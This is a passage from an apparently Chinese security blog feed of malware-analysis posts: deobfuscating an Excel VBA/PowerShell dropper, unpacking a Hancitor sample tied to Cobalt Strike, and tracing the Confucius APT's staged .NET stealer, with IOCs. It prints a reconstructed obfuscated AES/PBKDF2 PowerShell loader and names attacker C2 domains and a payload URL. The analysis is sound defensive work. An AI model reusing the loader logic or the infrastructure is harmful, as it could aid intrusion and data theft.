src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107152132397.png" alt="image-20220107152132397"></p><p>即如下完整脚本</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107151823141.png" alt="image-20220107151823141"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$MmUz</span>=<span class="string">&#x27;base64 code&#x27;</span>;</span><br><span class="line">&amp;<span class="string">&#x27;sal&#x27;</span> oM <span class="built_in">new-ObJeCT</span>;.<span class="string">&#x27;Add-Type&#x27;</span> <span class="literal">-AssemblyName</span> <span class="string">&#x27;System.Drawing&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">OtTAsS</span></span> &#123;<span class="keyword">param</span> ([<span class="built_in">String</span>]<span class="variable">$</span>&#123;IgAa&#125;, [<span class="built_in">String</span>]<span class="variable">$</span>&#123;pcxC&#125;)<span class="variable">$</span>&#123;byTuRo&#125; = [<span class="type">Convert</span>]::<span class="string">&quot;FROmBASe64string&quot;</span>(<span class="variable">$</span>&#123;IGAA&#125;);</span><br><span class="line"><span class="variable">$</span>&#123;TlAS&#125; = &amp;(<span class="string">&#x27;Om&#x27;</span>) bYtE[](<span class="number">32</span>);[<span class="built_in">Array</span>]::<span class="string">&quot;CoPy&quot;</span>(<span class="variable">$</span>&#123;bYTuRo&#125;, <span class="number">0</span>, <span class="variable">$</span>&#123;TLaS&#125;, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line"><span class="variable">$</span>&#123;rcxz0&#125; = .(<span class="string">&#x27;Om&#x27;</span>) SystEM.sEcURITY.cRyptOgRAPhY.RfC2898deRIVeBYtEs(<span class="variable">$</span>&#123;PCxc&#125;,<span class="variable">$</span>&#123;tLAS&#125;);</span><br><span class="line"><span class="variable">$</span>&#123;Xa2d&#125; = <span class="variable">$</span>&#123;rCxZ0&#125;.<span class="string">&quot;GEtBYTES&quot;</span>(<span class="number">32</span>);</span><br><span class="line"><span class="variable">$</span>&#123;DEfS&#125; = <span class="variable">$</span>&#123;Rcxz0&#125;.<span class="string">&quot;geTbyTES&quot;</span>(<span class="number">16</span>);</span><br><span class="line"><span class="variable">$</span>&#123;HmaC&#125; = .(<span class="string">&#x27;Om&#x27;</span>) sYsTEM.sEcUrItY.CRYPtOgRapHY.HMAcSHA1(,<span class="variable">$</span>&#123;rcxz0&#125;.<span class="string">&quot;getBYtes&quot;</span>(<span class="number">20</span>));</span><br><span class="line"><span class="variable">$</span>&#123;eedER&#125; = <span class="variable">$</span>&#123;hMAc&#125;.<span class="string">&quot;compuTehAsh&quot;</span>(<span class="variable">$</span>&#123;bytuRO&#125;, <span class="number">52</span>, <span class="variable">$</span>&#123;BYTURO&#125;.<span class="string">&quot;LeNGTh&quot;</span> - <span class="number">52</span>);</span><br><span class="line"><span class="keyword">IF</span> (&amp;<span class="string">&#x27;Compare-Object&#x27;</span> <span class="variable">$</span>&#123;eeDER&#125; (<span class="variable">$</span>&#123;byTUrO&#125;[<span class="number">32</span><span class="type">..51</span>]) <span class="literal">-SyncWindow</span> <span class="number">0</span>) &#123;<span class="keyword">throw</span> <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line"><span class="variable">$</span>&#123;Aes&#125; = .(<span class="string">&#x27;Om&#x27;</span>) sECuRITY.CryPTOgRapHY.rijnDAelMANAgED;</span><br><span class="line"><span class="variable">$</span>&#123;QAsAq&#125; = <span class="variable">$</span>&#123;aES&#125;.<span class="string">&quot;cREATeDeCRYPTOr&quot;</span>(<span class="variable">$</span>&#123;XA2D&#125;, <span class="variable">$</span>&#123;deFS&#125;);</span><br><span class="line"><span class="variable">$</span>&#123;MJOkO&#125; = <span class="variable">$</span>&#123;QasAq&#125;.<span class="string">&quot;TRaNsFoRmfINALbLOCK&quot;</span>(<span class="variable">$</span>&#123;bYTUro&#125;, <span class="number">52</span>, <span class="variable">$</span>&#123;BYTuRO&#125;.<span class="string">&quot;lenGtH&quot;</span> - <span class="number">52</span>);</span><br><span class="line"><span class="variable">$</span>&#123;adAmi&#125; = .(<span class="string">&#x27;Om&#x27;</span>) System.Io.meMOrYSTream(<span class="variable">$</span>&#123;MJOkO&#125;, <span class="variable">$</span>&#123;FalSE&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">IF</span> (<span class="variable">$</span>&#123;mjoKO&#125;[<span class="number">0</span>] <span class="operator">-eq</span> <span class="number">0</span>x1f) </span><br><span class="line">&#123;<span class="variable">$</span>&#123;aDaMi&#125; = &amp;(<span class="string">&#x27;Om&#x27;</span>) SYsTEM.IO.cOMpRessION.gZIpStReAm(<span class="variable">$</span>&#123;adami&#125;, [<span class="type">IO.Compression.CompressionMode</span>]::<span class="string">&quot;DEcomPrESS&quot;</span>)&#125;</span><br><span class="line"><span class="variable">$</span>&#123;sTREAMreadEr&#125; = &amp;(<span class="string">&#x27;Om&#x27;</span>) sYsTEM.iO.sTrEaMReadEr(<span class="variable">$</span>&#123;aDAmI&#125;, <span class="variable">$</span>&#123;TRUe&#125;);</span><br><span class="line"><span class="variable">$</span>&#123;sTrEAmrEaDeR&#125;.<span class="string">&quot;REAdtOeND&quot;</span>()&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">bAvV</span><span class="params">(<span class="variable">$</span>&#123;t64IN&#125;)</span></span>&#123;<span class="variable">$</span>&#123;bCzA&#125;  = [<span class="type">System.Convert</span>]::<span class="string">&quot;frOmbASe64StrINg&quot;</span>(<span class="variable">$</span>&#123;T64<span class="keyword">iN</span>&#125;);</span><br><span class="line"><span class="variable">$</span>&#123;SeNegS&#125; = [<span class="type">System.Text.Encoding</span>]::<span class="string">&quot;uTf8&quot;</span>.<span class="string">&quot;gETSTring&quot;</span>(<span class="variable">$</span>&#123;bCzA&#125;);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$</span>&#123;SeneGS&#125;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$Fghg</span>= <span class="number">408</span> + <span class="number">1041</span>;</span><br><span class="line"><span class="variable">$r44r</span>=Ottass <span class="literal">-Igaa</span> <span class="variable">$MmUz</span> <span class="literal">-Pcxc</span> <span class="variable">$Fghg</span>;</span><br><span class="line"><span class="variable">$OkKiiS</span>=Bavv(<span class="variable">$r44r</span>);</span><br><span class="line"><span class="variable">$OkKiiS</span></span><br></pre></td></tr></table></figure><p>成功输出为powershell脚本</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107152345760.png" alt="image-20220107152345760"></p><p>继续分析powershell脚本输出后的这一部分</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107152454491.png" alt="image-20220107152454491"></p><p><code>|&amp; ((GET-VAriAbLe &#39;*mdR*&#39;).NaMe[3,11,2]-JOIn&#39;&#39;)</code>这部分字符串表示为iex，删除即可</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107152658501.png" alt="image-20220107152658501"></p><p>解除混淆后为powershell内容，与之前看到的类似</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107152742183.png" alt="image-20220107152742183"></p><p>继续去其混淆</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107154143439.png" alt="image-20220107154143439"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107154221330.png" alt="image-20220107154221330"></p><p>最后又是下载图片文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107154254927.png" alt="image-20220107154254927"></p><p>手工去其混淆如下原理</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107155454055.png" alt="image-20220107155454055"></p><p>或可使用工具 PSUnveil</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107160158896.png" alt="image-20220107160158896"></p><p>继续修改脚本，可看到提取的结果被传递给值 ${MAGG}。输出${MAGG}即可。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107155024438.png" alt="image-20220107155024438"></p><p>输出为base64</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107160110119.png" alt="image-20220107160110119"></p><p>将首先获取系统的 LCID 并将数值转换为字符串，然后将字符串转换为 Char，接下来把从图片文件中提取的base64字符串，Base64解码成一个字节数组。最后，它将通过 LCID值为1041对数据进行xor。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107160150814.png" alt="image-20220107160150814"></p><p>继续进行解码的到一个可执行文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107143012009.png" alt="image-20220107143012009"></p><p>一个dll文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107160534332.png" alt="image-20220107160534332"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107160611099.png" alt="image-20220107160611099"></p><p>参考链接：</p><p><a href="https://www.kahusecurity.com/tools.html">https://www.kahusecurity.com/tools.html</a></p><p><a href="https://pcsxcetrasupport3.wordpress.com/2021/12/07/peeling-away-the-layers-of-obfuscation-from-excel-vba-to-dll/">https://pcsxcetrasupport3.wordpress.com/2021/12/07/peeling-away-the-layers-of-obfuscation-from-excel-vba-to-dll/</a></p><p><a href="https://docs.microsoft.com/en-us/openspecs/office_standards/ms-oe376/6c085406-a698-4e12-9d4d-c3b0ee3dbc4a">https://docs.microsoft.com/en-us/openspecs/office_standards/ms-oe376/6c085406-a698-4e12-9d4d-c3b0ee3dbc4a</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/python-bundle-can-teach-you-everything-you-need-know.1280x600.jpg&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="windows" scheme="https://www.ggsec.cn/categories/windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Windows" scheme="https://www.ggsec.cn/tags/Windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>obfuscation_from_Excel_VBA_Part1</title>
    <link href="https://www.ggsec.cn/obfuscation-from-Excel-VBA.html"/>
    <id>https://www.ggsec.cn/obfuscation-from-Excel-VBA.html</id>
    <published>2022-01-06T12:50:38.000Z</published>
    <updated>2022-11-25T12:52:52.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/python-bundle-can-teach-you-everything-you-need-know.1280x600.jpg"></p><span id="more"></span><p>查看文档，看到有禁用宏的警告<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/doc-1_thumb.png"></p><p>使用oletools剥离出宏代码<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641473629299.png"></p><p>简单的可以看出多个十六进制拼接后转为字符串后执行。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641473666508.png"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/doc-6-b.png"></p><p>简单的整理拼接后</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641474311645.png"></p><p>输出十六进制</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641474498666.png"></p><p>转char字符串，将十六进制解码为字符串后，我们现在发现我们面临一个 PowerShell 脚本，该脚本是 Invoke Dosfuscation ，经过混淆。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641474595093.png"><br>可参考以下原理和链接<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641475928987.png"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641477148175.png"></p><p><a href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf">https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf</a></p><p><a href="https://i.blackhat.com/briefings/asia/2018/asia-18-bohannon-invoke_dosfuscation_techniques_for_fin_style_dos_level_cmd_obfuscation.pdf">https://i.blackhat.com/briefings/asia/2018/asia-18-bohannon-invoke_dosfuscation_techniques_for_fin_style_dos_level_cmd_obfuscation.pdf</a></p><p>参考以上把call改为echo<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641477516560.png"></p><p>输出以下红框处。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641477695198.png"></p><p>代码整理后如下：<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641477805668.png"></p><p>还有一层混淆，将其修改为以下powershell代码将其base64代入：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$base64data</span> = <span class="string">&quot;insert compressed and base64 data here&quot;</span></span><br><span class="line"><span class="variable">$data</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$base64data</span>)</span><br><span class="line"><span class="variable">$ms</span> = <span class="built_in">New-Object</span> System.IO.MemoryStream</span><br><span class="line"><span class="variable">$ms</span>.Write(<span class="variable">$data</span>, <span class="number">0</span>, <span class="variable">$data</span>.Length)</span><br><span class="line"><span class="variable">$ms</span>.Seek(<span class="number">0</span>,<span class="number">0</span>) | <span class="built_in">Out-Null</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sr</span> = <span class="built_in">New-Object</span> System.IO.StreamReader(<span class="built_in">New-Object</span> System.IO.Compression.DeflateStream(<span class="variable">$ms</span>, [<span class="type">System.IO.Compression.CompressionMode</span>]::Decompress))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$line</span> = <span class="variable">$sr</span>.ReadLine()) &#123;  </span><br><span class="line">    <span class="variable">$line</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641478185560.png"><br>执行后再次得到dos混淆</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641478230228.png"><br>大体可以看到下载文件进行执行解密等操作</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641478328293.png"></p><p><a href="https://pcsxcetrasupport3.wordpress.com/2021/12/07/peeling-away-the-layers-of-obfuscation-from-excel-vba-to-dll/">https://pcsxcetrasupport3.wordpress.com/2021/12/07/peeling-away-the-layers-of-obfuscation-from-excel-vba-to-dll/</a></p><p><a href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf">https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf</a></p><p><a href="https://i.blackhat.com/briefings/asia/2018/asia-18-bohannon-invoke_dosfuscation_techniques_for_fin_style_dos_level_cmd_obfuscation.pdf">https://i.blackhat.com/briefings/asia/2018/asia-18-bohannon-invoke_dosfuscation_techniques_for_fin_style_dos_level_cmd_obfuscation.pdf</a></p><p><a href="https://www.filescan.io/uploads/61a2d7a9effcae2254f2cacb/reports/b584f955-81c0-49b3-9c10-c371712e2b0a/overview">https://www.filescan.io/uploads/61a2d7a9effcae2254f2cacb/reports/b584f955-81c0-49b3-9c10-c371712e2b0a/overview</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/python-bundle-can-teach-you-everything-you-need-know.1280x600.jpg&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="windows" scheme="https://www.ggsec.cn/categories/windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Windows" scheme="https://www.ggsec.cn/tags/Windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>HANCITOR_WITH_COBALT_STRIKE</title>
    <link href="https://www.ggsec.cn/HANCITOR-WITH-COBALT-STRIKE.html"/>
    <id>https://www.ggsec.cn/HANCITOR-WITH-COBALT-STRIKE.html</id>
    <published>2021-10-17T01:02:14.000Z</published>
    <updated>2022-11-25T12:52:22.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/use-msfconsoles-generate-command-obfuscate-payloads-evade-antivirus-detection.1280x600.jpg"></p><span id="more"></span><p>下载大神抓到的样本与流量。点开查看邮件，与流量包。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634437579658.png"><br>邮件中下载doc，而使用olevba对doc分析宏，而宏中加载了dll，也就是说rundll32 kikus.dll,GBSLWSDVGOE。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634437081531.png"><br>同时可以看到该文档隐藏了一个对象。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634438360548.png"><br>拖到x32dbg中进行动态分析第一个阶段的payload。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634434181044.png"><br>下几个断点。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634432744916.png"><br>断到断点处进过几次的对EAX内存转储，可以看到像MZ一样的头。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634433951527.png"><br>往下走点就可以看到真正的pe头文件了。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634432706390.png"><br>保存转储后的文件，第二个阶段的payload。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634434063443.png"><br>丢到010编辑器中，并搜索4d 5a，发现在436fh中。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634434402890.png"><br>将其余前面部分删除。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634434477817.png"><br>拖到pestudio中，可以在导出表中看到真正的函数入口点。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634434554610.png"><br>拖到IDA中，找到函数入口。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634434781078.png"><br>进入sub_10001870函数。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634439597489.png"><br>sub_10001AA0获取计算机信息，获取外网ip，发送c2服务器。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634439708507.png"><br>sub_100025B0函数复制一些字符串。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634436768608.png"><br>sub_10002CD0函数。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634435668717.png"><br>第二个阶段的payload重新拖到x32dbg中，设置sub_100025B0和sub_10002CD0的虚拟地址为断点，断到断点处在eax中对其进行内存转储。发现转储的内容为下图几个地址。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634436961174.png"><br>并可以看到对其往外发送本计算机的信息。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634437015162.png"><br>在流量包中可以看到HANCITOR C2 流量。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634437361292.png"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634437452980.png"><br>COBALT STRIKE HANCITOR 流量<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634437733547.png"><br>COBALT STRIKE 流量<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634437860573.png"></p><p>参考链接：<a href="https://www.malware-traffic-analysis.net/2021/06/17/index.html">https://www.malware-traffic-analysis.net/2021/06/17/index.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/use-msfconsoles-generate-command-obfuscate-payloads-evade-antivirus-detection.1280x600.jpg&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="windows" scheme="https://www.ggsec.cn/categories/windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Windows" scheme="https://www.ggsec.cn/tags/Windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>魔罗桫组织与 Pegasus 间谍软件</title>
    <link href="https://www.ggsec.cn/Confucius.html"/>
    <id>https://www.ggsec.cn/Confucius.html</id>
    <published>2021-09-20T23:01:11.000Z</published>
    <updated>2022-11-25T13:26:52.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/learn-c-start-designing-games-apps.1280x600.jpg"></p><span id="more"></span><h2 id="1-起源"><a href="#1-起源" class="headerlink" title="1.起源"></a>1.起源</h2><p>APT组织”魔罗桫”（又名为Confucius），是一个长期针对中国，巴基斯坦，尼泊尔等地区，主要瞄准政府机构，军工企业，核能行业等领域进行网络间谍活动的活跃组织。</p><p>此类恶意文档主要通过钓鱼邮件进行传播，用户打开该恶意文档后，显示的是看似正常的相关报告，背后会通过office宏从黑客的服务端下载恶意文件并隐蔽执行，最终受害用户计算机被黑客组织控制，资料被窃取。恶意word文件打开后实际内容如下。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632179901761.png"><br>该活动涉及两步攻击。在第一阶段，向目标发送一封没有恶意负载的电子邮件，其中包含从合法的巴基斯坦报纸文章中复制的内容。伪造的发件人地址冒充巴基斯坦武装部队的公关部门 。</p><p>两天后，第二封电子邮件（据称是巴基斯坦军方关于 Pegasus 间谍软件的警告）将发送给目标，其中包含指向恶意加密 Word 文档的 <code>cutt.ly </code>链接和解密密码。发件人地址模拟了类似于第一封电子邮件上的服务。<br>如果目标点击链接或“取消订阅”链接，它将从 parinari[.]xyz 域下载 Word 文档。<br>这些电子邮件要么从巴基斯坦的 ExpressVPN 出口节点发送，要么从攻击者控制下的邮件服务器发送。<br>检查包含宏的加密文档<br>输入消息中提到的密码后，屏幕上会显示包含宏的文档。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632179787599.png"></p><h2 id="2-攻击流程"><a href="#2-攻击流程" class="headerlink" title="2.攻击流程"></a>2.攻击流程</h2><p>打开文档后在临时目录中创建了一个名为 skfk.txt 的 .NET DLL 文件，其中填充了文档“Comments”属性中的内容。然后通过 PowerShell 将文件加载到内存中。</p><p>第 1 阶段是一个简单的下载和执行程序。它从同一个域下载一个 ASCII 文件并将其转换为二进制文件，然后将其加载到内存中并跳转到一个动态函数。</p><p>第 2 阶段也是 .NET DLL 文件，它从 parinari[.]xyz 下载第三个文件，将其从 ASCII 转换为二进制，然后创建一个计划任务来加载它。</p><p>第 3 阶段类似于第 1 阶段，唯一的变化是检索下一阶段的 URL。</p><p>第 4 阶段是最终的payload，它永远不会以明文形式写入文件磁盘。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/Confucius.jpg" alt="流程图"></p><h2 id="3-第一阶段"><a href="#3-第一阶段" class="headerlink" title="3. 第一阶段"></a>3. 第一阶段</h2><p>powershell 内存加载解码skfk.txt。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632183088705.png"><br>skfk.txt内容在备注这一段，转为二进制进行加载。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632183165539.png"><br>转为二进制的文件<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632183310714.png"><br>拖到pestudio可以看到二进制文件是C#写的DLL文件文件名为Tysdf.dll<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632183446025.png"><br>拖dnspy反编译工具下可以看到该DLL的功能是下载<code>https://parinari.xyz/SowpnTdb.txt</code>第二阶段的文件进行内存加载。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632183689778.png"></p><h2 id="4-第二阶段"><a href="#4-第二阶段" class="headerlink" title="4. 第二阶段"></a>4. 第二阶段</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632183903672.png"></p><h2 id="5-第三阶段"><a href="#5-第三阶段" class="headerlink" title="5. 第三阶段"></a>5. 第三阶段</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632183973915.png"></p><h2 id="6-第四阶段"><a href="#6-第四阶段" class="headerlink" title="6. 第四阶段"></a>6. 第四阶段</h2><p>最终有效载荷是一个 .NET DLL 文件，旨在窃取具有以下扩展名的文档和图像：<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632184465255.png"><br>检查每个用户的“文档”、“下载”、“桌面”和“图片”文件夹。DLL 文件还会检查 C: 以外的驱动器。</p><p>当找到与所列扩展名之一匹配的文件时，将计算其 MD5 哈希值并将其与从命令和控制 (C&amp;C) 服务器 pirnaram[.]xyz 检索到的排除列表进行比较。</p><p>如果未列出哈希，则该文件将通过 C&amp;C 发送到以机器名称和用户名的串联命名的目录。每个机器名称-用户名字符串的排除列表都不同。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632184522858.png"></p><h2 id="7-IOC"><a href="#7-IOC" class="headerlink" title="7. IOC"></a>7. IOC</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Main</span> object - <span class="string">&quot;decrypted-Alert#6285.docx&quot;</span>  </span><br><span class="line"> <span class="title class_">SHA256</span> 1FD861DB97C66B27620108C8227CB09225B6EE70818E73ECB659C317FF005B64 </span><br><span class="line"> </span><br><span class="line"> <span class="title class_">SHA1</span> 50F10AB1CAC45C9C6DA93C027557046A1D1984C0 </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> <span class="title class_">MD5</span> 47CBF19AF54979B0B8461E8CE2E832EE </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="title class_">Dropped</span> executable file  </span><br><span class="line"></span><br><span class="line"> <span class="title class_">SHA256</span> <span class="attr">C</span>:\<span class="title class_">Users</span>\admin\<span class="title class_">AppData</span>\<span class="title class_">Local</span>\<span class="title class_">Temp</span>\skfk.<span class="property">txt</span></span><br><span class="line"> </span><br><span class="line">7E3349C6DC753CD5B5AE5D89D4F4952838D31E4780DD2872CC0C6AE8B962CADA </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第一阶段<span class="variable constant_">DLL</span></span><br><span class="line"><span class="title class_">SHA256</span> <span class="attr">hash</span>: 7e3349c6dc753cd5b5ae5d89d4f4952838d31e4780dd2872cc0c6ae8b962cada</span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA3</span>-<span class="number">384</span> <span class="attr">hash</span>: 